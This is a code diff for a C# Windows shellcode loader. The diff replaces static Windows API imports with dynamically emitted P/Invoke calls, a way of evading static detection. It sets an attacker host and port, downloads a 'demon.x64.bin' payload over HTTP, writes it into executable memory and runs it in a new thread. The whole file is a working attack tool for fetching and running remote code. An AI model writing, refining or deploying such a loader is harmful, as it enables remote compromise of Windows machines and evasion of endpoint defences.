@@ -4,41 +4,68 @@ using System.Runtime.InteropServices;
 using System.IO.MemoryMappedFiles;
 using System.Text;
 using System.Threading;
+using System.Reflection;
+using System.Reflection.Emit;
 
 namespace ShellcodeLoader
 {
     public class Loader
     {
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+        public static object DynamicPInvokeBuilder(Type type, string library, string method, Object[] args, Type[] paramTypes)
+        {
+            AssemblyName assemblyName = new AssemblyName("Temp01");
+            AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
+            ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("Temp02");
 
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
-            uint dwSize, uint flAllocationType, uint flProtect);
+            MethodBuilder methodBuilder = moduleBuilder.DefinePInvokeMethod(method, library, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, type, paramTypes, CallingConvention.Winapi, CharSet.Ansi);
 
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
-            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
+            moduleBuilder.CreateGlobalFunctions();
 
-        [DllImport("kernel32.dll")]
-        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
-            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
-            IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+            MethodInfo dynamicMethod = moduleBuilder.GetMethod(method);
+            object res = dynamicMethod.Invoke(null, args);
+            return res;
+        }
 
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+        public static IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect)
+        {
+            Type[] paramTypes = { typeof(IntPtr), typeof(UInt32), typeof(UInt32), typeof(UInt32) };
+            Object[] args = { lpAddress, dwSize, flAllocationType, flProtect };
+            object res = DynamicPInvokeBuilder(typeof(IntPtr), "Kernel32.dll", "VirtualAlloc", args, paramTypes);
+            return (IntPtr)res;
+        }
 
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+        public static IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, ref UInt32 lpThreadId)
+        {
+            Type[] paramTypes = { typeof(UInt32), typeof(UInt32), typeof(IntPtr), typeof(IntPtr), typeof(UInt32), typeof(UInt32).MakeByRefType() };
+            Object[] args = { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
+            object res = DynamicPInvokeBuilder(typeof(IntPtr), "Kernel32.dll", "CreateThread", args, paramTypes);
+            return (IntPtr)res;
+        }
 
-        [DllImport("Kernel32.dll")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+        public static Int32 WaitForSingleObject(IntPtr Handle, UInt32 Wait)
+        {
+            Type[] paramTypes = { typeof(IntPtr), typeof(UInt32) };
+            Object[] args = { Handle, Wait };
+            object res = DynamicPInvokeBuilder(typeof(Int32), "Kernel32.dll", "WaitForSingleObject", args, paramTypes);
+            return (Int32)res;
+        }
 
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate void MyFunction();
+        public enum StateEnum
+        {
+            MEM_COMMIT = 0x1000,
+            MEM_RESERVE = 0x2000,
+            MEM_FREE = 0x10000
+        }
 
-        [DllImport("kernel32.dll")]
-        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+        public enum Protection
+        {
+            PAGE_READONLY = 0x02,
+            PAGE_READWRITE = 0x04,
+            PAGE_EXECUTE = 0x10,
+            PAGE_EXECUTE_READ = 0x20,
+            PAGE_EXECUTE_READWRITE = 0x40,
+        }
 
         [DllImport("bcrypt.dll")]
         public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);
@@ -93,8 +120,8 @@ namespace ShellcodeLoader
             WriteCombineModifierflag = 0x400
         }
 
-        public static string host = "<IP>";
-        public static string port = "<PORT>";
+        public static string host = "192.168.10.30";
+        public static string port = "8000";
 
         static byte[] getterShellcode()
         {
@@ -103,10 +130,11 @@ namespace ShellcodeLoader
             using (var client = new WebClient())
             {
                 // Download the shellcode
-                shellcode = client.DownloadData("http://" + host + ":" + port + "/agents/windows/cs");
+                Console.WriteLine("http://" + host + ":" + port + "/demon.x64.bin");
+                shellcode = client.DownloadData("http://" + host + ":" + port + "/demon.x64.bin");
             }
 
-            // Base64 decoding
+            /*// Base64 decoding
             shellcode = Convert.FromBase64String(Encoding.UTF8.GetString(shellcode));
 
             // XOR decryption
@@ -137,7 +165,7 @@ namespace ShellcodeLoader
             if (ntStatus != 0)
                 throw new Exception("BCryptDecrypt failed with status " + ntStatus);
 
-            shellcode = decryptedShellcode;
+            shellcode = decryptedShellcode;*/
 
             return shellcode;
         }
@@ -145,23 +173,22 @@ namespace ShellcodeLoader
         static void Main(string[] args)
         {
 
-            byte[] shellcode = getterShellcode();
+            byte[] x64shellcode = getterShellcode();
 
-            var baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
+            IntPtr funcAddr = VirtualAlloc(
+                              IntPtr.Zero,
+                              (uint)x64shellcode.Length,
+                              (uint)StateEnum.MEM_COMMIT,
+                              (uint)Protection.PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.Length);
 
-            // Copy the shellcode into the memory region
-            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
+            IntPtr hThread = IntPtr.Zero;
+            uint threadId = 0;
+            IntPtr pinfo = IntPtr.Zero;
 
-            // For VirtualProtect
-            uint oldProtect;
-            VirtualProtect(baseAddress, (uint)shellcode.Length, (uint)MemoryProtection.ExecuteRead, out oldProtect);
-
-            // For CreateThread
-            IntPtr threadId;
-            var hThread = CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadId);
-
-            // Wait infinitely on this thread to stop the process exiting
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
             WaitForSingleObject(hThread, 0xFFFFFFFF);
+            return;
         }
     }
 }
